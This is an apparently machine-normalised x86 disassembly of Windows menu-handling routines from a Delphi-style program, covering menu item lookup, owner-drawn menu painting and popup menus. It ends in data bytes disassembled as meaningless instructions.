jne r-xdata
xor edx edx
mov eax edi
call sub_4351bc
sub_43523c
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_434868
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_434868
mov esi eax
xor eax eax
movzx eax [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_44e6c4
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_435298
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_4353c3
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_434868
mov edi eax
test edi edi
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_434868
mov edi eax
jmp r-xdata
test edi edi
je r-xdata
mov eax edi
call sub_4333e4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4333f4
mov edi eax
lea eax [ ebp - 0x8 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_40502c
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
call sub_40502c
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
sub esi 0x4
mov esi [ esi ]
push ebx
lea eax [ ebp - 0x10 ]
movzx edx [ ebp + 0x8 ]
call sub_40502c
mov eax [ ebp - 0x10 ]
call sub_405324
push eax
push esi
lea eax [ ebp - 0x14 ]
mov edx [ edi + 0x30 ]
movzx edx [ edx ]
call sub_40502c
mov eax [ ebp - 0x14 ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub ebx 0x4
mov ebx [ ebx ]
xor eax eax
lea edx [ ebp - 0x18 ]
mov eax [ edi + 0x30 ]
call sub_4361c8
cmp [ ebp - 0x18 ] 0x0
sete al
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4353ca
lea eax [ ebp - 0x18 ]
mov edx 0x5
call sub_404e68
retn
mov ebx eax
jmp r-xdata
sub_4353d8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_43523c
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
movzx eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_435298
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_435554
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_4349ec
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_434868
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_434868
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40a3d8
mov eax [ ebp + 0x10 ]
call sub_40a308
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_435620
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_438b98
test eax eax
je r-xdata
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4355fc
mov [ ebx + 0x41 ] 0x1
sub_435648
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_404114
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4355fc
mov [ ebx + 0x41 ] 0x1
sub_4356dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_435174
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_434ff8
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_435770
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4357ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4357d6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4357f8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_435d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435d33
lea eax [ ebp - 0x30 ]
call sub_404e44
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ esi + 0x4 ]
call sub_434924
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_459320
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
movzx edx [ esi + 0x4 ]
call sub_434908
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_435b5f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_435b42
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_4245e4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424478
mov eax [ ebp - 0x24 ]
movzx eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_435ff0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435b49
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4245e4
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_4353d8
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_434868
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_434868
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_435ca2
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424018
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_435c7d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_435c60
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_4245e4
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_424478
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_435c67
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_4245e4
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_438e4c
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_459320
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_434868
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_434868
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
movzx ecx [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_434868
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_434898
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4167c8
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_434898
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x270 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x160 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_458f44
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_458fcc
jmp r-xdata
sub_435c84
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_435d3c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_416668
pop esi
pop ebx
retn
push ebx
push sub_4357ac
call sub_41ebd8
mov [ ebx + 0x10 ] eax
sub_435d80
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_434670
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_435d3c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_435df4
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_435d64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43471c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_435e4c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_43089c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
movzx edx [ eax + 0x34 ]
mov eax ebx
call sub_4355fc
mov [ ebx + 0x41 ] 0x1
movzx edx [ eax + 0x5f ]
mov eax ebx
call sub_4355fc
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_435e98
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_43089c
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_457828
mov edx eax
jmp r-xdata
mov si 0xffc7
call sub_404160
mov edx eax
jmp r-xdata
sub_435ee4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_415348
mov edx esp
mov eax ebx
call sub_435f94
mov eax ebx
call sub_435e4c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_433fd0
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4344b8
mov eax [ ebx + 0x34 ]
call sub_431768
mov eax ebx
call sub_43508c
mov eax ebx
call sub_435e98
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
movzx edx [ ebx + 0x60 ]
movzx ebp [ eax + edx * 2 ]
movzx eax [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
movzx eax [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_431898
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_435f94
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov [ eax + 0x58 ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x5c ] edx
pop ecx
pop edx
pop edi
pop esi
retn
sub_435fb4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4167c8
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4167c8
cmp ebp [ eax ]
jne r-xdata
sub_435ff0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423ec8
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_42360c
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_423ec8
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_42360c
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_404160
mov edx [ r-xdata ]
call sub_4040f0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423ec8
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_42360c
jmp r-xdata
movzx eax [ ebp + 0x8 ]
push eax
movzx eax [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_4360d8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404e98
mov edi 0x1
jmp r-xdata
mov eax [ esi ]
call sub_405120
cmp edi eax
jle r-xdata
mov eax [ esi ]
movzx eax [ eax + edi - 0x1 ]
mov edx [ rw-data ]
movzx eax al
bt [ edx ] eax
jae r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp [ eax + edi - 0x1 ] 0x26
jne r-xdata
inc edi
jmp r-xdata
inc edi
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor ebx ebx
cmp edi 0x1
jle r-xdata
mov eax esi
mov ecx 0x1
mov edx edi
call sub_4053c4
mov edx edi
dec edx
mov eax esi
mov ecx 0x4
call sub_4053c4
jmp r-xdata
mov [ esp + 0x4 ] 0x0
mov eax [ esi ]
mov [ esp ] eax
mov ebp [ esp ]
test ebp ebp
je r-xdata
mov [ esp + 0x5 ] 0x0
mov eax [ esi ]
cmp [ eax + edi - 0x2 ] 0x28
sete [ esp + 0x5 ]
jmp r-xdata
sub ebp edi
cmp ebp 0x2
setge [ esp + 0x4 ]
jmp r-xdata
sub ebp 0x4
mov ebp [ ebp ]
mov [ esp + 0x6 ] 0x0
mov eax [ esi ]
cmp [ eax + edi + 0x1 ] 0x29
sete [ esp + 0x6 ]
jmp r-xdata
cmp [ esp + 0x5 ] 0x0
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
test bl bl
je r-xdata
movzx ebx [ esp + 0x6 ]
jmp r-xdata
sub_4361c8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404e44
mov ebx 0x1
mov eax esi
test eax eax
je r-xdata
mov edi eax
cmp edi ebx
jl r-xdata
sub eax 0x4
mov eax [ eax ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
movzx edx [ esi + ebx - 0x1 ]
movzx edx dl
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
movzx edx [ esi + ebx - 0x1 ]
call sub_40502c
sub_436230
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4362d3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4360d8
mov edi [ ebp - 0x8 ]
lea edx [ ebp - 0xc ]
mov eax esi
call sub_4360d8
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] edi
mov ebx [ ebp - 0x10 ]
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
push esi
mov eax [ ebp - 0x4 ]
call sub_405324
push eax
push ebx
mov [ ebp - 0x10 ] edi
mov eax [ ebp - 0x10 ]
call sub_405324
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4362da
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
sub esi 0x4
mov esi [ esi ]
sub_4362e4
adc al [ eax ]
add [ eax ] al
mov ah 0x84
dec edx
add [ eax ] ah
mov cl 0x4a
add [ eax - 0x63ffb57c ] dh
mov al 0x4a
add [ esp + eax * 4 - 0x4ff3ffb6 ] ch
dec edx
add [ eax + 0x68004a84 ] ch
mov al 0x4a
add [ esp + eax * 4 - 0x4aa3ffb6 ] ah
dec edx
add [ eax + 0x70004a84 ] ah
mov al 0x4a
add [ esp + eax * 4 - 0x4d0fffb6 ] bl
dec edx
add [ eax + 0xc004a84 ] bl
mov dl 0x4a
add [ esp + eax * 4 - 0x49efffb6 ] dl
dec edx
add [ eax + 0xc004a84 ] dl
mov dh 0x4a
add [ esp + eax * 4 - 0x4e73ffb6 ] cl
dec edx
add [ eax - 0x4bffb57c ] cl
mov ch 0x4a
add [ esp + eax * 4 - 0x4a9bffb6 ] al
dec edx
add [ eax - 0x6bffb57c ] al
mov dh 0x4a
add [ esp + eax * 4 + 0x4a ] bh
add [ eax - 0x4a ] al
dec edx
add [ eax - 0x7c ] bh
dec edx
add [ eax + 0x74004ab1 ] ah
test [ edx ] cl
mov esp 0x70004ab1
test [ edx ] cl
cmp al 0xb2
dec edx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4363dc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4363e3
retn
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax [ rw-data ]
call sub_403f64
mov eax rw-data
call sub_404e44
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_405af0
sub_4365c8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
